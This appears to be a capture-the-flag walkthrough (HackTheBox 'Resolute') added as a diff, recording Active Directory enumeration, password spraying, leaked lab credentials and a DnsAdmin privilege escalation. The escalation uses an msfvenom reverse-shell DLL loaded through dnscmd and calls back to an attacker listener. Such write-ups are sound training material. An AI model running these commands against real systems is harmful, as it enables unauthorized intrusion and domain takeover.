@@ -1,0 +1,49 @@
+# user:
+  - nmap directory for initial scans
+  - domain: megabank.local
+  - Can connect with anonymous RPC
+    - ```rpcclient -U "" -N 10.10.10.169```
+    - Found a list of users (users.txt) and groups (groups.txt)
+  - Enumeration with LDAP (ldap_search.txt)
+    - ```ldapsearch -h 10.10.10.169 -p 389 -x -b "DC=megabank,DC=local" -s subtree '(objectclass=*)'```
+  - enum4linux found 'enum.txt'
+    - 'index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!'
+  - stuff_creds.sh is a script I wrote to test that password for all users
+    - Found creds for melanie
+  - SMB Shares
+    - IPC$ (READ ONLY)
+    - NETLOGON (READ ONLY)
+    - SYSVOL (READ ONLY)
+  - But none of the shares I can read have anything useful (IPC and NETLOGON don't have anything at all)
+  - Tried to login to Evil-WinRM as melanie, and it worked!
+  - user pwned
+
+# root:
+  - Just as a general enum tip (that I like to do)
+    - Look at WHEN the files/directories were modified
+    - If it's around the time of the release of the box, it's probably safe to assume it's relevant
+    - If it's like 2016-2017 or even 2018 (2-4 years out), it's probably safe to assume it's not
+  - Another user 'ryan' has a directory in 'C:\Users' -> probably indicating the need for 2 privescs
+    - melanie -> ryan -> admin?
+  - Found a weird text file in 'C:\PSTranscripts\20191203\'
+    - Looks like a powershell history file
+    - Found this 'cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!' -> maybe that's ryan's pw?
+    - Yep! Can login as ryan with evil-winrm
+  - Found a note in ryan's desktop
+    - 'due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute'
+  - Ryan's a member of the contractor's group
+  - Doesn't look like he has more access to the shares than melanie
+  - Tried to connect to the 'NETLOGON' share as ryan, and it told me that it couldn't connect to 'Resolute.megabank.local' -> new domain added to /etc/hosts
+  - Still nothing interesting in the shares
+  - ```whoami /all``` shows we're a 'DnsAdmin'
+  - Did some googling to find out if there are any privescs I can do
+  - [found one](https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/)
+  - Here are the steps:
+    - [LOCAL] ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.128 LPORT=4444 --platform=windows -f dll > plugin.dll```
+    - [LOCAL] ```sudo python smbserver.py share ./``` - with smbserver found [here](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
+    - [LOCAL] ```nc -nlvp 4444```
+    - [REMOTE] ```dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.128\share\plugin.dll```
+    - [REMOTE] ```sc.exe stop dns```
+    - [REMOTE] ```sc.exe start dns```
+  - After you restart dns, you'll catch an Admin reverse shell in your nc listener
+  - root pwned
